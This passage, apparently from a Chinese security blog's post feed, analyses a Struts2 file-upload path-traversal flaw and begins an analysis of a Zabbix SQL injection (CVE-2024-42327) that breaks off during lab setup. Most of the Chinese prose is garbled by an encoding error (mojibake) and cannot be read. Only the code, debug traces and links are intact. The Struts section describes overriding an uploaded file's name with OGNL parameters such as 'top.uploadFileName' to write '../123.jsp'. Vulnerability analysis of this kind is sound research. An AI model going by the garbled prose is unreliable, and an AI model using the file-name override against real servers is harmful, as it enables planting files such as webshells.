class="line">\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\[&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;])|(\(&#x27;(\w-?|[\u4e00-\u9fa5]-?)+&#x27;\)))*</span><br></pre></td></tr></table></figure><p>æš‚ä¸”ä¸è¯´é»‘åå•ï¼Œç™½åå•æ ¡éªŒä¹Ÿæ— æ³•é€šè¿‡ï¼Œè¿™é‡Œåªå…è®¸å‡ ç§æ ·å¼çš„å‚æ•°é€šè¿‡æ ¡éªŒï¼Œä¸¥æ ¼é™åˆ¶äº†å­—ç¬¦é›†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa.aa</span><br><span class="line">aaaa[&#x27;abc&#x27;]</span><br><span class="line">aaaa(&#x27;abc&#x27;)</span><br><span class="line">aaaa[0]</span><br><span class="line">aaaa(0)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåªèƒ½å¦å¯»ä»–è·¯äº†ï¼Œå›åˆ°æ€è€ƒå¦‚ä½•åœ¨ognlå‚æ•°ç»‘å®šæ—¶å¦‚ä½•è¿›è¡Œå‚æ•°è¦†ç›–</p><p><img src="https://s2.loli.net/2024/12/20/HAZ2JKSGzftCy6R.png" alt="img"></p><p>åœ¨<code>FileUploadInterceptor#intercept</code>å¤„ç†åä¼ ç»™<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>è¿›è¡Œå‚æ•°ç»‘å®š</p><p>è·Ÿè¿›<code>newStack.setParameter(name, value.getObject());</code>è¿™æ®µä»£ç å¯ä»¥å‘ç°ä½¿ç”¨äº†<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>è¿›è¡Œå®ç°ï¼Œè€Œè¿™ä¸ªæ–¹æ³•å…è®¸ä½¿ç”¨OGNLè¡¨è¾¾å¼</p><blockquote><p>setParameter</p><p>void setParameter(String expr, Object value)</p><p>Attempts to set a property on a bean in the stack with the given expression using the default search order. N.B.: unlike #setValue(String,Object) it doesnâ€™t allow eval expression.</p><p>Parameters:</p><p>expr - the expression defining the path to the property to be set.</p><p>value - the value to be set into the named property</p></blockquote><p>å…³äºOGNLè¡¨è¾¾å¼çš„åŸºç¡€çŸ¥è¯†å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p><p>äºæ˜¯å¯ä»¥ç”¨OGNLè¡¨è¾¾å¼æ“ä½œä¸€æ³¢ï¼Œçœ‹çœ‹èƒ½å¦è·å–åˆ°uploadFileNameä»è€Œå®ç°è¦†ç›–</p><p>å…ˆè¯´è¯´å¤šæ–‡ä»¶ä¸Šä¼ çš„æƒ…å†µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadsAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;File&gt; upload;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è¿™é‡Œæ˜¯Listï¼Œç»“åˆOGNLè¡¨è¾¾å¼å’Œç™½åå•æ ¡éªŒï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°ä½¿ç”¨<code>uplooadFileName[0]</code>å°±å¯ä»¥è·å–åˆ°ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å</p><p>ç”±S2-066çš„åˆ†æå¯çŸ¥ï¼Œè¦èƒ½åœ¨<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>è¦†ç›–åŸå§‹çš„æ–‡ä»¶åï¼Œåˆ™å¿…é¡»è¦è®©è¢«è¦†ç›–çš„é”®å€¼å¯¹åœ¨TreeMapå¯¹è±¡ä¸­æ›´é å‰ï¼Œäºæ˜¯è¿™é‡Œç»™uploadé¦–å­—æ¯å¤§å†™ä¸ºUploadï¼Œç„¶ååŠ ä¸ŠuploadFileName[0]ä¸€èµ·ä¼ å…¥æ–‡ä»¶ä¸Šä¼ æ¥å£</p><p>åœ¨<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setValue(java.lang.String, java.lang.Object, boolean)</code>æ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹</p><p><img src="https://s2.loli.net/2024/12/20/4dzWjRoMI2DhaJL.png" alt="img"></p><p>è°ƒè¯•è¿™é‡Œçš„ä»£ç å³å¯å‘ç°ï¼ŒæˆåŠŸç”±<code>uploadFileName[0]</code>è·å–åˆ°åŸå§‹æ–‡ä»¶å<code>1.txt</code>ï¼Œç„¶å<code>setValue</code>è¦†ç›–ç›®æ ‡å€¼ä¸º<code>../123.jsp</code></p><p>ç„¶åèŠèŠå•æ–‡ä»¶ä¸Šä¼ çš„æƒ…å†µï¼Œç±»ä¼¼åœ°ï¼Œæ—¢ç„¶å¤§å°å†™ä¸èƒ½è§£å†³ï¼Œå°±é€šè¿‡OGNLè¡¨è¾¾å¼è·å–</p><p>ç»è¿‡æ·±å…¥çš„è°ƒè¯•å¯ä»¥æ‰¾åˆ°è¿™é‡ŒOGNLè¡¨è¾¾å¼ç”Ÿæˆè¯­æ³•æ ‘åè·å–ç›¸åº”å€¼çš„é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getProperty:122, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">getProperty:3344, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:121, ASTProperty (ognl)</span><br><span class="line">evaluateGetValueBody:212, SimpleNode (ognl)</span><br><span class="line">getValue:258, SimpleNode (ognl)</span><br><span class="line">setValueBody:222, ASTChain (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:829, Ognl (ognl)</span><br><span class="line">lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:-1, 1943089905 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$106)</span><br><span class="line">compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Map context, Object target, Object name)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">    <span class="type">CompoundRoot</span> <span class="variable">root</span> <span class="operator">=</span> (CompoundRoot)target;</span><br><span class="line">    <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> (OgnlContext)context;</span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">instanceof</span> Integer) &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">index</span> <span class="operator">=</span> (Integer)name;</span><br><span class="line">        <span class="keyword">return</span> root.cutStack(index);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(name <span class="keyword">instanceof</span> String)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;top&quot;</span>.equals(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.size() &gt; <span class="number">0</span> ? root.get(<span class="number">0</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(Object o : root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (OgnlRuntime.hasGetProperty(ognlContext, o, name) || o <span class="keyword">instanceof</span> Map &amp;&amp; ((Map)o).containsKey(name)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> OgnlRuntime.getProperty(ognlContext, o, name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (OgnlException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getReason() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Caught an Ognl exception while getting property &quot;</span> + name;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(msg, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IntrospectionException var11) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context.containsKey(OgnlValueStack.THROW_EXCEPTION_ON_FAILURE)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchPropertyException</span>(target, name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œtopä¼šè·å–rootæ ¹å…ƒç´ çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè€Œæ­¤æ—¶ç¬¬ä¸€ä¸ªå°±æ˜¯UploadActionå¯¹è±¡</p><p><img src="https://s2.loli.net/2024/12/20/QGNUfezOpLoicA7.png" alt="img"></p><p>äºæ˜¯å¯ä»¥ç”¨<code>top.uploadFileName</code>è¿™ä¸ªOGNLè¡¨è¾¾å¼è·å–åˆ°åŸå§‹æ–‡ä»¶åï¼Œå¹¶ä¸”<code>t</code>åœ¨TreeMapå¯¹è±¡ä¸­å¯ä»¥æ¯”<code>U</code>æ’æ›´åé¢ï¼Œä»è€Œè¦†ç›–åŸå§‹æ–‡ä»¶å</p><p><img src="https://s2.loli.net/2024/12/20/XWrVyLpOcU1FPTE.png" alt="img"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å’Œå®˜æ–¹æ¼æ´é€šå‘Šæ‰€è¿°ä¸€è‡´ï¼Œè¿™é‡Œæ ¸å¿ƒæ€è·¯å’ŒS2-066å·®ä¸å¤šï¼Œåªæ˜¯è¿™é‡Œé€šè¿‡OGNLè¡¨è¾¾å¼è·å–éœ€è¦è¦†ç›–çš„å¯¹è±¡</p><p>è€Œå®˜æ–¹çš„ä¿®å¤å»ºè®®å¦‚ä¸‹</p><blockquote><p>Upgrade to Struts 6.4.0 or greater and use Action File Upload Interceptor</p></blockquote><p>ä¿®æ”¹struts2ä¾èµ–åˆ°<code>6.4.0</code>æˆ–æ›´é«˜å¯ä»¥æ‰¾åˆ°è¿™ä¸ªä¸Šä¼ æœºåˆ¶çš„å®ç°é€»è¾‘</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> invocation.getInvocationContext().getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (!(invocation.getAction() <span class="keyword">instanceof</span> UploadedFilesAware)) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Action: &#123;&#125; doesn&#x27;t implement: &#123;&#125;, ignoring file upload&quot;</span>, invocation.getProxy().getActionName(), UploadedFilesAware.class.getSimpleName());</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">UploadedFilesAware</span> <span class="variable">action</span> <span class="operator">=</span> (UploadedFilesAware)invocation.getAction();</span><br><span class="line">            <span class="built_in">this</span>.applyValidation(action, multiWrapper);</span><br><span class="line">            Enumeration&lt;String&gt; fileParameterNames = multiWrapper.getFileParameterNames();</span><br><span class="line">            List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">                UploadedFile[] uploadedFiles = multiWrapper.getFiles(inputName);</span><br><span class="line">                <span class="keyword">if</span> (uploadedFiles != <span class="literal">null</span> &amp;&amp; uploadedFiles.length != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(UploadedFile uploadedFile : uploadedFiles) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, uploadedFile, uploadedFile.getOriginalName(), uploadedFile.getContentType(), inputName)) &#123;</span><br><span class="line">                            acceptedFiles.add(uploadedFile);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;No files have been uploaded/accepted&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.debug(<span class="string">&quot;Passing: &#123;&#125; uploaded file(s) to action&quot;</span>, acceptedFiles.size());</span><br><span class="line">                action.withUploadedFiles(acceptedFiles);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è¿™é‡Œå’ŒåŸæœ¬çš„é€»è¾‘å‘ç”Ÿäº†è¾ƒå¤§å˜åŒ–ï¼Œåªå¤„ç†äº†æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„å‚æ•°ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è¦†ç›–çš„é—®é¢˜äº†</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-42327 Zabbix SQLæ³¨å…¥æ¼æ´åˆ†æ</title>
      <link href="/2024/12/20/CVE-2024-42327%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/20/CVE-2024-42327%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Zabbix æ˜¯ä¸€æ¬¾å¼€æºçš„ç½‘ç»œç›‘æ§å’ŒæŠ¥è­¦ç³»ç»Ÿï¼Œç”¨äºç›‘è§†ç½‘ç»œè®¾å¤‡ã€æœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡APIæ¥å£ï¼Œå‘ user.get APIç«¯ç‚¹å‘é€æ¶æ„æ„é€ çš„è¯·æ±‚ï¼Œæ³¨å…¥SQLä»£ç ï¼Œä»¥å®ç°æƒé™æå‡ã€æ•°æ®æ³„éœ²æˆ–ç³»ç»Ÿå…¥ä¾µã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p><img src="https://s2.loli.net/2024/12/20/26EGzIoJ9CemNAZ.png" alt="img"></p><p>6.0.0 &lt;&#x3D; Zabbix &lt;&#x3D; 6.0.31</p><p>6.4.0 &lt;&#x3D; Zabbix &lt;&#x3D; 6.4.16</p><p>Zabbix 7.0.0</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å‚è€ƒ<a href="https://forum.butian.net/share/3056">https://forum.butian.net/share/3056</a></p><p>è®¿é—®<a href="https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.0/">https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.0/</a></p><p><img src="https://s2.loli.net/2024/12/20/jRrvoJCIAtd16nb.png" alt="img"></p><p>é€‰æ‹© vmx.tar.gz è¿™ä¸ªï¼Œè§£å‹åŒå‡».vmx æ–‡ä»¶å³å¯å¯¼å…¥ vmware workstation</p><p>ç„¶åå¼€æœºå³å¯ï¼Œè®¿é—®æœºå™¨ip 80ç«¯å£å³å¯çœ‹åˆ° zabbix ç™»å½•é¡µé¢ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯root&#x2F;zabbix</p><h2 id="phpè°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#phpè°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="phpè°ƒè¯•ç¯å¢ƒæ­å»º"></a>phpè°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒ<a href="https://juejin.cn/post/7201509055713493049">https://juejin.cn/post/7201509055713493049</a></p><p>æˆ‘è¿™é‡Œæºç ä» <a href="https://cdn.zabbix.com/zabbix/sources/stable/7.0/">https://cdn.zabbix.com/zabbix/sources/stable/7.0/</a> ä¸‹è½½çš„</p><p><img src="https://s2.loli.net/2024/12/20/QgklH1JMrYKsX2j.png" alt="img"></p><p>è™šæ‹Ÿæœºä¸­æ²¡æœ‰phpå‘½ä»¤ï¼Œä½†æ˜¯æœ‰php-fpmå‘½ä»¤å¯ä»¥ç”¨</p><p><code>php-fpm -i</code>è·å–åˆ°é…ç½®ä¿¡æ¯åä½¿ç”¨wizardå®‰è£…php xdebugæ‹“å±•ï¼Œè¿™é‡Œå®‰è£…xdebug-3.4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget https://xdebug.org/files/xdebug-3.4.0.tgz</span><br><span class="line">tar -xvzf xdebug-3.4.0.tgz</span><br><span class="line"><span class="built_in">cd</span> xdebug-3.4.0</span><br><span class="line"><span class="comment"># ç¼–è¯‘æ‰€éœ€ç¯å¢ƒ</span></span><br><span class="line">yum install -y install gcc automake autoconf libtool make php-devel</span><br><span class="line">phpize</span><br><span class="line">./configue</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> module</span><br><span class="line"><span class="built_in">cp</span> xdebug.so /usr/lib64/php/modules/</span><br></pre></td></tr></table></figure><p>ç„¶å<code>vi /etc/php.d/99-xdebug.ini</code> æ·»åŠ è¡Œ<code>zend_extension = xdebug</code></p><p>ç„¶å<code>systemctl restart php-fpm</code>é‡å¯ php-fpmï¼Œæœ€å<code>php-fpm -v</code>æŸ¥çœ‹æ˜¯å¦æˆåŠŸç”Ÿæ•ˆ</p><p><img src="https://s2.loli.net/2024/12/20/ksliz1RfDIxGACb.png" alt="img"></p><p>é…ç½®php.iniæ–‡ä»¶ï¼Œåœ¨æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xdebug.mode = debug,develop,trace</span><br><span class="line">xdebug.start_with_request = yes</span><br><span class="line">xdebug.client_host = 192.168.182.1</span><br><span class="line">xdebug.client_port = 9003</span><br></pre></td></tr></table></figure><p>å…·ä½“ä½œç”¨å¯ä»¥å‚è€ƒ<a href="https://xdebug.org/docs/develop%EF%BC%8C%E8%BF%99%E9%87%8C%E6%98%AF%E6%8C%87%E5%AE%9Avscode%E6%89%80%E5%9C%A8%E6%9C%BA%E5%AD%90%E7%9A%84ip%E5%92%8C%E9%80%9A%E4%BF%A1%E7%AB%AF%E5%8F%A3%EF%BC%88%E6%B3%A8%E6%84%8F%E8%A6%81%E5%BC%80%E6%94%BE%E8%BF%99%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%89">https://xdebug.org/docs/developï¼Œè¿™é‡Œæ˜¯æŒ‡å®švscodeæ‰€åœ¨æœºå­çš„ipå’Œé€šä¿¡ç«¯å£ï¼ˆæ³¨æ„è¦å¼€æ”¾è¿™ä¸ªç«¯å£ï¼‰</a></p><p>ç„¶ååœ¨vscodeä¸Šé¢æ·»åŠ è°ƒè¯•é…ç½®ï¼Œå°†ç”Ÿæˆçš„php xdebugé…ç½®çš„é»˜è®¤é…ç½®æ”¹ä¸º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;è¿œç¨‹è°ƒè¯•&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;php&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">9003</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;pathMappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;/usr/share/zabbix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/ui&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.182.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/rUBD1LtuqGgMybQ.png" alt="img"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>Zabbixçš„addRelatedObjectså‡½æ•°ä¸­çš„CUserç±»ä¸­å­˜åœ¨SQLæ³¨å…¥ï¼Œæ­¤å‡½æ•°ç”± CUser.get å‡½æ•°è°ƒç”¨ï¼Œå…·æœ‰APIè®¿é—®æƒé™çš„ç”¨æˆ·å¯åˆ©ç”¨é€ 